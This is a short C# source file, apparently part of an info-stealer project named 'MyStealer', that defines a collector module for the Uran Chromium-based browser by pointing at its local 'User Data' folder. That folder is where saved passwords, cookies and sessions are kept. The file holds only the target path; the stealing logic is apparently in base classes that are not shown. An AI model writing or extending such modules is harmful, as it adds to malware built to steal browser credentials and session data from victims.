using System.IO;
using System;

namespace MyStealer.Collector.Browser.ChromiumBased
{
    public class Uran : Chromium
    {
        public override string Name => "Uran";

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "uCozMedia", "Uran", "User Data");
    }
}
